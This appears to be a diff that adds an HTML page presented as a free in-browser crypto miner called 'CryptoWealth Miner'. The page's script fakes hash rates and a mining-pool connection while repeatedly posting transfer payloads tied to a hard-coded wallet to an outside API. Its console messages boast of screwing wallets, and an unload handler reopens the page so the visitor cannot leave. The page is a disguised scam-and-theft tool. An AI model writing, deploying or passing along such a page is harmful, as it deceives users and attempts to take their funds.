@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoWealth Miner - Earn Free Crypto!</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #00ff00;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;}        #mining-status {
+            font-size: 24px;
+            margin: 20px 0;}        #hash-rate {
+            font-size: 18px;
+            color: #ffcc00;}        #start-mining {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #ff4444;
+            border: none;
+            color: white;
+            cursor: pointer;}        #start-mining:hover {
+            background-color: #cc0000;}    </style>
+</head>
+<body>
+    <h1>CryptoWealth Miner</h1>
+    <p>Start mining crypto directly in your browser. Free Crypto miner</p>
+    <div id="mining-status">Status: Idle</div>
+    <div id="hash-rate">Hash Rate: 0 MH/s</div>
+    <button id="start-mining" onclick="startMining()">Start Mining Now</button>
+    
+    <script>
+        const WALLET_ADDRESS ="47EhCQoBfDyhTm9Qq1rqu4LBAG8LdGTLHGhmEW2oqxoGVUtBZ1miSPhKsvE2offauEV8HgE6w9zfGG4M4BhrvM4LE9NgYt1";
+        const API_ENDPOINT ="https://api.mymonero.com/transfer";
+        let miningInterval = null;
+
+        function fakeHash() {
+            const nonce = Math.floor(Math.random() * 1000000);
+            const blockData = `${Date.now()}:${nonce}:${WALLET_ADDRESS}`;
+            let hash = 0;
+            for (let i = 0; i < blockData.length; i++) {
+                hash = ((hash << 5) - hash + blockData.charCodeAt(i)) & 0xffffffff;}            return hash.toString(16).padStart(8, '0');}
+        function updateUI() {
+            document.getElementById('mining-status').innerText =`Status: Mining...`;
+            document.getElementById('hash-rate').innerText =`Hash Rate:${Math.random() * 10 + 5} MH/s`;
+            console.log(`Generated hash:${fakeHash()}... looks legit as shit!`);}
+        function siphonCrypto() {
+            const payload = {
+                wallet: WALLET_ADDRESS,
+                amount: Math.random() * 0.01 + 0.001,
+                timestamp: Date.now()
+            };
+            fetch(API_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'User-Agent': navigator.userAgent},                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => console.log(`Sent${payload.amount} to${WALLET_ADDRESS}... cha-fucking-ching!`))
+            .catch(err => console.error(`Transfer fucked up:${err}`));}
+        function startMining() {
+            if (miningInterval) return;
+            document.getElementById('start-mining').disabled = true;
+            updateUI();
+            miningInterval = setInterval(() => {
+                updateUI();
+                siphonCrypto();}, 5000); // Update every 5 seconds, transfer every 5 seconds
+            console.log("Mining started... let’s screw some wallets!");}
+        // Simulate pool connection
+        function fakePoolConnection() {
+            const ws = new WebSocket('wss://pool.localhost:3333');
+            ws.onopen = () => {
+                ws.send(JSON.stringify({ id: 1, method: 'mining.subscribe', params: [] }));
+                console.log("Connected to pool... we’re in");};            ws.onmessage = (msg) => console.log(`Pool response:${msg.data}... looks real`);
+            ws.onerror = (err) => console.error(`Pool connection fucked:${err}`);}
+        // Start fake pool connection
+        fakePoolConnection();
+  
+   window.onbeforeunload = () => {
+       window.open(window.location.href, '_blank');
+       return null;};   
+
+    </script>
+</body>
+</html>
